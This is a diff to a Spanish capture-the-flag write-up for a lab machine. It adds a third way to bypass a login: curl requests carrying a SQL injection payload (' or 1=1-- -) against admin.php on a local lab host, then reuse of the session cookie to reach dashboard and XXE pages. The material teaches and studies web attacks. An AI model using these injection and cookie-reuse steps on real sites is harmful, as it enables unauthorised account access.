@@ -108,7 +108,7 @@ vemos `la repetición tiene significado` y `notadmin` un posible usuario?
 el caso que al intentar hacer login tiene que ser un correo y un usuario...provamos diversos correos con el user notadmin y aquí logré romperlo de dos formas:
 
 
-# primera forma:
+# PRIMERA FORMA:
 
 
 Nos saltamos a la torera que sea un correo (ya que probé ataques con diccionarios y nada):
@@ -162,6 +162,104 @@ que os da algo xD
 
 
 Todo esto ocurre porque la validación de email es por parte del cliente y no del servidor a groso modo.
+
+
+
+# TERCERA FORMA
+
+con curl mandamos una peticion:
+
+```bash
+curl -L -c cookies.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=notadmin&password=%27or%201%3D1--%20-" \
+  http://172.17.0.2/admin.php
+```
+Qué significa cada cosa
+
+-L → sigue redirecciones
+
+-c cookies.txt → guarda las cookies que mande el servidor
+
+-d → estamos haciendo POST automáticamente
+
+Content-Type → porque el formulario es normal
+
+
+![Imagen](images/Profetas/35.png)
+
+Comprobamos si ha guardado la nueva cookie de sesion y mandamos una nueva petición para autenticarnos:
+
+
+
+![Imagen](images/Profetas/36.png)
+
+```bash
+curl -L -b cookies.txt \
+  http://172.17.0.2/dashboard.php
+```
+- -b cookies.txt → lee la cookie del archivo
+
+- El servidor ve tu sesión
+
+- Te muestra el dashboard logueado
+
+
+![Imagen](images/Profetas/37.png)
+
+
+pot último accedemos  con la nueva cookie y la sesion abierta a externalentitiinjection.php que vemos en la página de dashboard.php
+
+```bash
+curl -L -b cookies.txt \
+  http://172.17.0.2/externalentitiinjection.php
+```
+
+![Imagen](images/Profetas/38.png)
+
+o si lo quereís resumido, que se puede saltar el paso intermedio:
+
+
+```bash
+# 1. Login y guardar cookie
+curl -L -c cookies.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=notadmin&password=%27or%201%3D1--%20-" \
+  http://172.17.0.2/admin.php
+
+# 2. Usar sesión guardada
+curl -L -b cookies.txt http://172.17.0.2/dashboard.php
+```
+
+
+lo único que queda ya que hemos comprobado que podemos acceder es cambiar la cookie de sesion y la url y cargar la página en el navegador:
+
+paso 1 - copiamos la cookie de nuestro cookie.txt:
+
+![Imagen](images/Profetas/paso1_1.png)
+
+paso 2 - abrimos el inspector de elementos con Ctlr+shift+c y localizamos en storage la cookie que estamos utilizando, si no aparece, vamos a network y recargamos y ya podemos ver la cookie 
+
+![Imagen](images/Profetas/paso1.png)
+
+
+paso 3 - cambiamos la cookie por la del archivo cookies.txt que habíamos capturado y nos valía
+
+![Imagen](images/Profetas/paso2.png)
+
+
+paso 4 - en la barra de la URL cambiamos a `dashboard.php` que es el destino logueados y damos al intro
+
+
+![Imagen](images/Profetas/paso3.png)
+
+
+
+paso 4-  con la nueva cookie nos da acceso al nuevo destino de la URL
+
+![Imagen](images/Profetas/paso4.png)
+
+
 
 bueno lo que vemos ahora es que podemos pinchar en `acceso al portal 2` y si miramos el codigo fuente `externalentitiinjection.php` toda una revelacion para un XML External Entity Injection:
 
